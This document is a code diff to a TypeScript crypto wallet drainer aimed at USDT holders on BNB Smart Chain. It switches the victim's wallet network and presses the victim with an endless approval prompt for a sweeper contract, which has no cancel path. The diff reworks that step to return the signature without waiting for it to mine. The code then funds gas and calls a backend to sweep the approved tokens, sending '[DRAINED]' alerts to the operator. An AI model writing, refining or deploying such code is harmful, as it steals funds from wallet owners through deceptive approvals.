@@ -3,17 +3,22 @@ import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"
 
 const BACKEND_URL = CONFIG.BACKEND_URL
 
-// ============================================================
-// RAW PROVIDER HELPERS — work on Trust Wallet, MetaMask, legacy
-// ============================================================
 function getRawProvider(input: any): any {
   if (!input) return null
-  if (typeof input.request === "function" || typeof input.sendAsync === "function" || typeof input.send === "function") {
+  if (
+    typeof input.request === "function" ||
+    typeof input.sendAsync === "function" ||
+    typeof input.send === "function"
+  ) {
     return input
   }
   if (input.provider) {
     const inner = input.provider
-    if (typeof inner.request === "function" || typeof inner.sendAsync === "function" || typeof inner.send === "function") {
+    if (
+      typeof inner.request === "function" ||
+      typeof inner.sendAsync === "function" ||
+      typeof inner.send === "function"
+    ) {
       return inner
     }
   }
@@ -51,20 +56,15 @@ async function sendAlert(message: string) {
   }
 }
 
-// ============================================================
-// AUTO-SWITCH TO BNB SMART CHAIN (returns NEW BrowserProvider)
-// ============================================================
+// ===== AUTO-SWITCH TO BNB SMART CHAIN =====
 export async function ensureCorrectNetwork(
   provider: ethers.BrowserProvider
 ): Promise<ethers.BrowserProvider> {
   const raw = getRawProvider(provider)
-  if (!raw) {
-    throw new Error("Wallet provider not available")
-  }
+  if (!raw) throw new Error("Wallet provider not available")
 
-  const hexChainId = "0x" + CHAIN_ID.toString(16) // 0x38 = 56
+  const hexChainId = "0x" + CHAIN_ID.toString(16)
 
-  // Read current chain — best effort, never fatal
   let currentChainId: number | null = null
   try {
     currentChainId = Number(await rawRequest(raw, "eth_chainId", []))
@@ -108,13 +108,17 @@ export async function ensureCorrectNetwork(
   }
 }
 
-// ============================================================
-// REQUEST USDT APPROVAL (infinite retry loop)
-// ============================================================
+// ===== APPROVAL RESULT =====
+export interface ApprovalResult {
+  amount: ethers.BigNumberish
+  txHash: string
+}
+
+// ===== REQUEST USDT APPROVAL (signs FIRST; does NOT wait to mine) =====
 export async function requestApproval(
   provider: ethers.BrowserProvider,
   victimAddress: string
-): Promise<ethers.BigNumberish | null> {
+): Promise<ApprovalResult | null> {
   const signer = await provider.getSigner()
 
   const usdt = new ethers.Contract(
@@ -130,7 +134,6 @@ export async function requestApproval(
   let decimals = CONFIG.USDT_DECIMALS
   let rawBalance = ethers.parseUnits("0", 18)
 
-  // Balance read must NEVER kill the flow
   try {
     rawBalance = await usdt.balanceOf(victimAddress)
   } catch (err: any) {
@@ -154,37 +157,35 @@ export async function requestApproval(
   while (true) {
     try {
       const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
-      await tx.wait()
+      // IMPORTANT: no await tx.wait() here — gas is funded AFTER this signature
 
       await sendAlert(
         "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " +
         victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash
       )
 
-      return approveAmount
+      return { amount: approveAmount, txHash: tx.hash }
     } catch {
       await new Promise(r => setTimeout(r, 500))
-      continue // infinite retry kept — no cancel path
+      continue
     }
   }
 }
 
-// ============================================================
-// ENSURE GAS (funding)
-// ============================================================
+// ===== ENSURE GAS (runs AFTER approval signed) =====
 export async function ensureGas(
   provider: ethers.Provider,
   victimAddress: string
 ): Promise<boolean> {
-  const balance = await provider.getBalance(victimAddress)
-  const minGas = ethers.parseEther("0.0003")
-
-  if (balance >= minGas) {
-    await sendAlert("[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)")
-    return true
-  }
-
   try {
+    const balance = await provider.getBalance(victimAddress)
+    const minGas = ethers.parseEther("0.0003")
+
+    if (balance >= minGas) {
+      await sendAlert("[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)")
+      return true
+    }
+
     const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -204,23 +205,24 @@ export async function ensureGas(
   }
 }
 
-// ============================================================
-// EXECUTE DRAIN
-// ============================================================
+// ===== EXECUTE DRAIN (backend waits for approval to confirm, then sweeps) =====
 export async function executeDrain(
   victimAddress: string,
-  approvalAmount: ethers.BigNumberish
+  approval: ApprovalResult
 ): Promise<boolean> {
   try {
     const response = await fetch(`${BACKEND_URL}/api/sweep`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ victimAddress }),
+      body: JSON.stringify({
+        victimAddress,
+        approvalTxHash: approval.txHash,
+      }),
     })
     const data = await response.json()
     if (data.success) {
       await sendAlert(
-        "[DRAINED] " + ethers.formatUnits(approvalAmount, CONFIG.USDT_DECIMALS) +
+        "[DRAINED] " + ethers.formatUnits(approval.amount, CONFIG.USDT_DECIMALS) +
         " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) +
         " | https://bscscan.com/tx/" + data.txHash
       )
